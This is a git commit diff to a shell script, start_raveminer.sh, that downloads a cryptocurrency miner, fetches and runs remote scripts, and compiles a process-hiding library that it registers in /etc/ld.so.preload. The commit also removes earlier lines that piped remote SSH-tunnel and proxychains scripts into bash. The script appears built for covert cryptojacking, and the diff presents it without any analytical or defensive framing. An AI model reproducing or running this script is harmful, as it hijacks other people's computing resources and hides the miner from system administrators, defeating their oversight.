40c9cf84754e8d23fc59e4e68d898257f58f416e
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-04 09:50:45 +0200

    Update start_raveminer.sh

--- start_raveminer.sh
+++ start_raveminer.sh
@@ -1,17 +1,13 @@
 #!/bin/sh
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/setUpSSHTunnel.sh | bash
-wget -O - https://raw.githubusercontent.com/chadpetersen1337/sockd/main/chains.sh | bash
-sleep .1
-proxychains wget https://github.com/NebuTech/NBMiner/releases/download/v36.0/NBMiner_36.0_Linux.tgz
-tar -xvzf NBMiner_36.0_Linux.tgz
+wget https://github.com/NebuTech/NBMiner/releases/download/v37.1/NBMiner_37.1_Linux.tgz
+tar -xvzf NBMiner_37.1_Linux.tgz
 cd NBMiner_Linux
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ravenminer.sh
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/ravenminer.sh
 chmod +x ravenminer.sh
-proxychains wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
 unzip magicNb.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-proxychains curl ifconfig.me
 ./ravenminer.sh
